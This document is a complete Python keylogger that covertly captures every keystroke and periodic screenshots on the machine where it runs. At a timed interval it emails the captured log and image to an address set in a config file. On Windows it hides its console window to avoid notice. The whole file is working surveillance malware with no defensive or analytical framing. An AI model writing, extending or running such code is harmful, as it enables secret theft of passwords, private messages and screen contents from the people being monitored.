import os
import smtplib
import threading
import time
import platform
import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
from PIL import ImageGrab

class Keylogger:
    def __init__(self, smtp_server, smtp_port, email, password, interval, device_id):
        self.log = []
        self.interval = interval
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.email = email
        self.password = password
        self.device_id = device_id

    def append_to_log(self, key, key_type):
        self.log.append({"key": key, "type": key_type, "time": time.time()})

    def on_press(self, key):
        try:
            self.append_to_log(key.char, "char")
        except AttributeError:
            if key == key.space:
                self.append_to_log(" ", "space")
            else:
                self.append_to_log(str(key), "special")

    def send_mail(self, message):
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = f"Keylogger Log from {self.device_id}"

            msg.attach(MIMEText(message, 'plain'))

            screenshot_path = "screenshot.png"
            attachment = open(screenshot_path, "rb")

            part = MIMEBase('application', 'octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {screenshot_path}")

            msg.attach(part)

            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()
            server.login(self.email, self.password)
            text = msg.as_string()
            server.sendmail(self.email, self.email, text)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):
        if self.log:
            log_message = json.dumps(self.log, indent=2)
            self.send_mail(log_message)
            self.log = []
        try:
            screenshot = ImageGrab.grab()
            screenshot.save("screenshot.png")
        except Exception as e:
            print(f"Failed to capture screenshot: {e}")
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    # Load configuration from file
    config = {}
    with open('config.json', 'r') as f:
        config = json.load(f)

    SMTP_SERVER = config.get("smtp_server")
    SMTP_PORT = config.get("smtp_port")
    EMAIL = config.get("email")
    PASSWORD = config.get("password")
    INTERVAL = config.get("interval", 60)
    DEVICE_ID = config.get("device_id", "Unknown Device")

    if not EMAIL or not PASSWORD:
        print("Email credentials are not set in configuration.")
        exit(1)

    if platform.system() == "Windows":
        import win32console
        import win32gui
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

    keylogger = Keylogger(SMTP_SERVER, SMTP_PORT, EMAIL, PASSWORD, INTERVAL, DEVICE_ID)
    keylogger.start()
